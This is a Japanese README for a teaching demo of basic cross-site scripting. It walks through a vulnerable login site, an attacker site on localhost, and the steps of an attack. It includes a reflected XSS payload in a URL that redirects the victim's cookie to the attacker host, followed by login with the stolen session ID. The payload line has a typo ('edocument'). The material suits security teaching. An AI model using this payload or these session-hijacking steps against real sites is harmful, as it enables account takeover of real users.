# XSSの初歩的な例と実害

を説明するデモです．

## 状況

XSS (_クロス_ サイト スクリプティング) の性質上，localhostの他にも別サイトが必要でした．

<dl>
  <dt>http://当日教える.com</dt>
  <dd>脆弱性を持ったサイト(以下，脆弱サイト)．ログイン機能がある．</dd>

  <dt>http://localhost:5000</dt>
  <dd>攻撃者の用意したサイト(以下，攻撃者サイト) ．</dd>

  <dt>被害者</dt>
  <dd>脆弱サイトのユーザ．攻撃者に脆弱サイトへログインされてしまう．</dd>
</dl>

## 脆弱サイトをいじってみる

```bash
$ browser http://当日教える.com
```

1. `/` において， `user: sampleuser`, `pass: samplepass` と入力してログイン
1. `/login` にて，「ようこそ，sampleuserさん!!」と表示されることを確認

_攻撃目的: `sampleuser/samplepass` を知らないのに，`sampleuser`としてログインする_

## 攻撃手順

### 攻撃者サイトを準備

```bash
$ cd 20131117-tokumaru-benkyokai/sample-sites/ex00_WhatIsXSS
$ carton install  # 大体5分以上かかります・・・・
$ carton exec perl -Ilib script/ex00_whatisxss-server
$ browser http://localhost:5000
```

### 怪しいリンクを踏ませて脆弱サイトのCookieを入手

1. 下記リンクは，攻撃者がTwitterなどにポストする(短縮URLなど使うとなおのこと引っ掛けやすい)
1. 被害者が下記リンクを踏む
1. 脆弱サイトにてXSS攻撃が成立する
1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)

```bash
$ browser http://当日教える.com/?confirm=<script>window.location="http://localhost:5000/?sid="+edocument.cookie</script>
```

### Cookie中のセッションIDを使って脆弱サイトにログイン

1. 攻撃者は先程手にしたセッションIDをコピー
1. 下記のように脆弱サイトにアクセスし，ログインが成立

```bash
$ browser http://当日教える.com/login?sid=[セッションID]
```
